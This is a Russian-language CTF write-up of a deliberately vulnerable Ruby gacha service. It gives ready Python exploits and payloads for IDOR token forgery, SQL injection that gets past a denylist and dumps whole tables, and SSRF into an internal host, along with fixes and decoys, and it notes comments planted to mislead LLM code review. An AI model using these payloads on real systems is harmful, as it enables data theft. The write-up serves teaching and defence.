# Xingyuan — Writeup

> Attack/Defense сервис. Симулятор гача-круток «звёздных желаний» на Ruby + Sinatra + SQLite.
> Три уязвимости, по одной на каждый флаг-стор (правда, SQLi из vuln 2 читает и чужие
> заметки — сторы не полностью изолированы). Каждая дыра нарочно замаскирована под «уже
> защищённую», а вокруг разбросаны ложные пути. Разбираем настоящие три и показываем, где
> приманки.

## Краткая сводка

Сервис `xingyuan` крутится на порту `1337`. Рядом стоит внутренний сервис `archive`
(порт `8080`), который наружу не торчит — до него достаёт только основное приложение.

Флаги чекер прячет в три разных места, и к каждому ведёт своя дыра:

| # | Флаг лежит в… | Уязвимость | Точка входа | Мнимая «защита» |
|---|---------------|------------|-------------|-----------------|
| 1 | приватной заметке предмета | Подделка share-токена (IDOR) | `GET /card/:token` | `shareable?` — проверка, которая всегда истинна |
| 2 | сообщении открытки во входящих | SQL-инъекция | `GET /api/inbox/search` | `sanitize_search` — денилист без boolean-инъекции |
| 3 | memo бэкапа в архиве | SSRF во внутренний сервис | `POST /api/import` | денилист хостов, не покрывающий `archive` |

Цепочка на каждый флаг короткая:

```
flag_id (attack_data)  ->  один запрос от лица нового игрока  ->  флаг в ответе
```

`flag_id`, который выдаёт джюри, — это `player_id` жертвы (для vuln 1 и 3). Больше ничего
знать не нужно: регистрируем свежий аккаунт и бьём по нужному эндпоинту.

Главный подвох таска: каждая дыра обёрнута в код, который **выглядит** как митигация. При
беглом чтении (в т.ч. если скормить исходник LLM) складывается впечатление «тут всё
санитайзится / проверяется». Настоящая работа — заметить, что защита не покрывает именно
нужный вектор.

## Классификация

Сервис самописный, поэтому собственных CVE у него нет — тип каждой слабости точнее
описывается через CWE и категорию OWASP Top 10 (2021). Для наглядности рядом — публичный
CVE со схожим механизмом.

| # | Тип | CWE | OWASP | Похожий CVE (для примера) |
|---|-----|-----|-------|---------------------------|
| 1 | IDOR через предсказуемый ключ объекта | [CWE-639](https://cwe.mitre.org/data/definitions/639.html) (Authorization Bypass Through User-Controlled Key) | A01: Broken Access Control | [CVE-2022-1352](https://nvd.nist.gov/vuln/detail/CVE-2022-1352) — GitLab, чтение защищённого issue по ID |
| 2 | SQL-инъекция сквозь неполный денилист | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (SQL Injection) | A03: Injection | [CVE-2022-21661](https://nvd.nist.gov/vuln/detail/CVE-2022-21661) — WordPress `WP_Query` SQLi |
| 3 | SSRF в обход фильтра по хосту | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) (Server-Side Request Forgery) | A10: SSRF | [CVE-2021-27905](https://nvd.nist.gov/vuln/detail/CVE-2021-27905) — Apache Solr ReplicationHandler SSRF |

Vuln 1 — это именно IDOR (CWE-639), а не «сломанная крипта»: токен не подписан, а объект
достаётся по чужому `id` без проверки владельца. Vuln 3 — «слепой» SSRF наизнанку: ответ
внутреннего сервиса возвращается атакующему в поле `source_memo`, так что данные утекают
напрямую, без out-of-band канала.

## Разведка

Регистрация тривиальная — `POST /api/register` с `{username, password}`, сессия в куке.
После логина видно несколько интересных маршрутов:

- `GET /card/:token` — публичная страница «поделиться карточкой». Без авторизации.
- `GET /api/inbox/search?q=...` — поиск по своим открыткам.
- `POST /api/backup` / `POST /api/import` — бэкап истории в «архив» и импорт по ссылке.
- `GET /api/profile/:id`, `GET /export/:id.json` — публичные данные любого игрока.
- `GET /api/leaderboard`, `POST /api/redeem`, `GET /api/avatar`, `GET /api/lore/:name` —
  это **приманки** (см. раздел «Ложные пути»), к флагам не ведут.

Два предупреждения:

1. Исходники засыпаны комментариями на китайском. Все они — вранье, и теперь вранье
   «подкреплённое»: рядом с фейковой митигацией стоит комментарий, который её хвалит
   («injection-ключевики вырезаются», «回环地址拦截», «归属校验»). Читаем сам код, а не
   комментарии.
2. Не всякая «дыра» ведёт к флагу. Часть эндпоинтов сделана специально, чтобы выглядеть
   уязвимо и съесть время. Флаги лежат ровно в трёх местах из таблицы выше.

---

## Уязвимость 1 — Подделка share-токена (IDOR)

### Разбор кода

Игрок может «расшарить» предмет из инвентаря отдельной карточкой. Ссылка вида
`/card/<token>`, где токен — это base64 от строки `xy:<instance_id>`:

```ruby
get '/card/:token' do
  decoded = b64_decode(params[:token])
  halt 404, erb(:notfound) unless decoded&.start_with?(SHARE_PREFIX)   # "xy:"
  iid = decoded[SHARE_PREFIX.length..].to_i
  @card = db.get_first_row(<<~SQL, [iid])
    SELECT inv.id AS instance_id, inv.private_note, inv.constellation, c.name, c.rarity, c.image
    FROM inventory inv JOIN characters c ON c.id = inv.character_id
    WHERE inv.id = ?
  SQL
  halt 404, erb(:notfound) unless @card && shareable?(@card)   # ← «проверка доступа»
  erb :card
end

def shareable?(card)
  # 仅公开处于分享态的卡片，星魂为负表示持有者已撤回分享
  card && card['constellation'].to_i >= 0
end
```

На вид доступ ограничен: карточка отдаётся, только если `shareable?(@card)`. Но
`constellation` — это счётчик «созвездий» предмета, он `DEFAULT 0` и **никогда не бывает
отрицательным**. То есть `shareable?` истинна всегда — это honeypot-проверка. Реальной
привязки к владельцу как не было, так и нет: маршрут достаёт любой предмет по его `id`.

Легитимный API заметок `GET /api/inventory/:id/note` владельца проверяет и отдаёт `403` —
а `/card/:token` идёт мимо него. Токен не секрет: base64 от `xy:<id>`, а `id` предметов
жертвы берётся из публичного `GET /api/profile/:id` (поле `showcase[].instance_id`).

### Эксплуатация

1. Берём `player_id` жертвы из `flag_id`.
2. Тянем её витрину: `GET /api/profile/<player_id>`.
3. Для каждого `instance_id` собираем токен `base64url("xy:<id>")` без `=`.
4. Открываем `GET /card/<token>` и читаем флаг из заметки.

```python
import base64, requests, re
base = f"http://{ip}:1337"
s = requests.Session()
prof = s.get(f"{base}/api/profile/{player_id}").json()
for it in prof["showcase"]:
    tok = base64.urlsafe_b64encode(f"xy:{it['instance_id']}".encode()).decode().rstrip("=")
    html = s.get(f"{base}/card/{tok}").text
    print(re.findall(r"[A-Z][A-Z0-9]{30}=", html))
```

Готовый эксплойт — `forge.py`.

### Как чинить

`shareable?` не защищает — это бутафория. Нужна настоящая проверка владельца в
`/card/:token`: тянуть `inv.player_id` и сравнивать с текущим игроком, **либо** класть в
токен случайный неугадываемый секрет вместо предсказуемого `id`. Если хочется оставить
«шаринг» — заводить отдельный флаг `shared` и выставлять его явно, а не полагаться на
всегда-истинное условие.

---

## Уязвимость 2 — SQL-инъекция в поиске

### Разбор кода

Поиск по входящим склеивает `q` прямо в текст SQL-запроса. Формально есть «санитайзер»,
поэтому на первый взгляд инъекция закрыта:

```ruby
SEARCH_DENYLIST = %r{\b(?:union|select|insert|update|delete|drop|alter|create|truncate|exec)\b|;|/\*|\*/}i

def sanitize_search(q)
  q.to_s.gsub(SEARCH_DENYLIST, '')   # вырезает «опасные» ключевики
end

get '/api/inbox/search' do
  require_login!
  q = sanitize_search(params[:q])
  rows = db.execute(
    "SELECT id, message FROM gifts " \
    "WHERE recipient_id = #{current_player['id']} AND message LIKE '%#{q}%'"
  )
  json(ok: true, results: rows.map { |r| { id: r['id'], message: r['message'] } })
end
```

`sanitize_search` — это **денилист, а не параметризация**, и обходится сразу двумя путями:

- **boolean-based** — ключевые слова из списка вообще не нужны: одинарная кавычка не
  экранируется, а строчный комментарий `--` в денилист **не входит**. Значит `q` спокойно
  закрывает `LIKE` и дописывает всегда-истинное условие, снимая фильтр `recipient_id`.
- **расщепление комментарием** — `gsub` проходит по строке **один раз** и результат
  повторно не сканирует. Поэтому `uni/**/on` после вырезания `/*` и `*/` **пересобирается**
  в `union` — и полноценная UNION-инъекция тоже проходит. То есть денилист не мешает читать
  **произвольные таблицы**, а не только `gifts`.

Итог: это не «выборка чужих открыток», а **arbitrary read всей SQLite** — включая
`inventory.private_note` (флаги vuln 1!) и bcrypt-хэши из `players`.

### Эксплуатация

Полезная нагрузка закрывает `LIKE`, добавляет `OR 1=1` и комментирует хвост:

```
q = %' OR 1=1-- -
```

Ни одного слова из денилиста здесь нет, `--` он не трогает — payload проходит целиком.
Итоговое условие превращается в `... LIKE '%%' OR 1=1-- ...`, и выдаются открытки **всех**
игроков вместе с флагами.

```python
import requests, random, string, re
s = requests.Session()
cred = "".join(random.choices(string.ascii_lowercase, k=12))
s.post(f"http://{ip}:1337/api/register", json={"username": cred, "password": cred})
r = s.get(f"http://{ip}:1337/api/inbox/search", params={"q": "%' OR 1=1-- -"})
for row in r.json()["results"]:
    print(re.findall(r"[A-Z][A-Z0-9]{30}=", str(row["message"])))
```

Готовый эксплойт — `sqli.py`. Своего `player_id` знать не нужно, инъекция сама достаёт всё.

**Усиленный вариант — UNION-дамп всей БД одним запросом.** Расщепляем ключевые слова
комментарием, чтобы обойти денилист, и тянем нужную таблицу напрямую:

```
q = ' uni/**/on sel/**/ect id, private_note fr/**/om inventory -- -
```

После `sanitize_search` это превращается в `' union select id, private_note from inventory -- -`
и возвращает **приватные заметки всех игроков** (то есть заодно и флаги vuln 1) в одном
ответе — без перебора `instance_id`. Тем же приёмом `... FROM players` выгружаются логины и
bcrypt-хэши. Практический вывод: одной этой инъекции достаточно, чтобы забрать флаги **и**
стора-2 (открытки), **и** стора-1 (заметки) — сторы здесь не изолированы.

> Инъекция read-only в смысле «без записи»: `db.execute` в gem `sqlite3` выполняет только
> первый стейтмент, так что stacked-запросы (`; UPDATE ...`) и запись не пройдут. Но на
> чтение это не ограничение — UNION достаёт любую таблицу.

### Как чинить

Денилист тут принципиально нечинибельный — его всегда можно обойти. Нужна параметризация:
передавать `q` плейсхолдером, а не в тексте запроса, и оставить фильтр по `recipient_id`:

```ruby
db.execute("SELECT id, message FROM gifts WHERE recipient_id = ? AND message LIKE ?",
           [current_player['id'], "%#{q}%"])
```

---

## Уязвимость 3 — SSRF во внутренний архив

### Разбор кода

Бэкап складывается во внутренний сервис `archive`, ключ — `player_id`:

```ruby
post '/api/backup' do
  require_login!
  pid = current_player['id']
  payload = { player_id: pid, player: current_player['username'],
              records: export_records(pid), memo: json_body['memo'].to_s }
  return json({ ok: false, error: 'архив недоступен' }, 502) unless archive_put(pid, payload)
  json(ok: true)
end
```

Импорт истории берёт URL из тела запроса и ходит по нему сам. Здесь тоже есть «SSRF-защита» —
денилист хостов:

```ruby
IMPORT_BLOCKED_HOSTS = %w[localhost 0.0.0.0 ::1 169.254.169.254 metadata.internal].freeze

def fetch_remote(raw_url)
  uri = URI.parse(raw_url.to_s)
  return nil unless uri.is_a?(URI::HTTP)
  host = uri.host.to_s.downcase
  return nil if IMPORT_BLOCKED_HOSTS.include?(host) ||
                host.start_with?('127.') || host.start_with?('169.254.')
  # ... GET uri, до 64 КБ ответа ...
end

post '/api/import' do
  require_login!
  raw = fetch_remote(json_body['url'])
  # ... парсим JSON, импортируем records ...
  json(ok: true, imported: imported, source_memo: export['memo'])
end
```

Фильтр отсекает наивный SSRF: `127.0.0.1`, `localhost`, cloud-metadata. Выглядит как
защита. Но он проверяет **строку хоста** и не делает DNS-резолв, поэтому не знает про
внутренние имена: хост `archive` в денилист не входит и спокойно проходит. Классическая
дыра «заблокировали loopback, но не внутренние сервисы».

Значит URL можно нацелить на `http://archive:8080/item/<pid>`. Приложение из своей сети
сходит в архив, а в ответе вернёт `source_memo` — то самое memo из чужого бэкапа с флагом.

### Эксплуатация

1. Берём `player_id` жертвы из `flag_id`.
2. Регистрируем свежий аккаунт.
3. Шлём `POST /api/import` с `url = http://archive:8080/item/<player_id>`.
4. Читаем флаг из `source_memo` ответа.

```python
import requests, random, string, re
s = requests.Session()
cred = "".join(random.choices(string.ascii_lowercase, k=12))
s.post(f"http://{ip}:1337/api/register", json={"username": cred, "password": cred})
r = s.post(f"http://{ip}:1337/api/import",
           json={"url": f"http://archive:8080/item/{player_id}"})
print(re.findall(r"[A-Z][A-Z0-9]{30}=", str(r.json().get("source_memo", ""))))
```

Готовый эксплойт — `ssrf.py`.

### Как чинить

Денилист по строке хоста дырявый. Правильно — **резолвить хост и проверять IP** перед
запросом: пускать только публичные адреса, а приватные диапазоны и внутренние имена (в т.ч.
`archive`) блокировать (лучше через allowlist доверенных источников). И не возвращать наружу
`source_memo` из чужого экспорта.

---

## Ложные пути

Помимо трёх настоящих дыр в сервисе намеренно оставлены эндпоинты, которые выглядят
уязвимо, но к флагам не ведут. Все они — тупики; заметить это — часть задачи.

| Приманка | На что похоже | Почему тупик |
|----------|---------------|--------------|
| `GET /api/leaderboard?sort=` | ORDER BY SQL-инъекция (`ORDER BY #{column}`) | `column` берётся из allowlist-мапы `{gems,name,joined}` с фолбэком на `p.gems`; пользовательская строка в запрос не попадает |
| `POST /api/redeem` | хардкод-бэкдор «промокода» (и комментарий «удалить до релиза») | сравнение `Rack::Utils.secure_compare(code, REDEEM_CODE)` со 128-битным секретом, который нигде не отдаётся и не логируется; даже при угадывании даёт лишь +500 гемов, а гемы флаги не открывают |
| `GET /api/avatar?src=` | второй SSRF (принимает URL) | хост сверяется с allowlist из фиктивных доменов, а сам запрос вообще не выполняется — эндпоинт лишь возвращает «прокси-ссылку». `archive`/loopback отсекаются |
| `GET /api/lore/:name` | LFI/path traversal (намёк на `lore/<name>.txt`) | `File.basename` срезает путь, дальше идёт поиск по `CATALOG` в памяти; файловая система не трогается вовсе |

Признак, отличающий настоящую дыру от приманки: настоящая ведёт к **чужим** приватным
данным (заметка, открытка, бэкап). Приманки отдают только публичное (имена, гемы, лор) или
не отдают ничего. Флаги — строго в трёх сторах из «Краткой сводки».
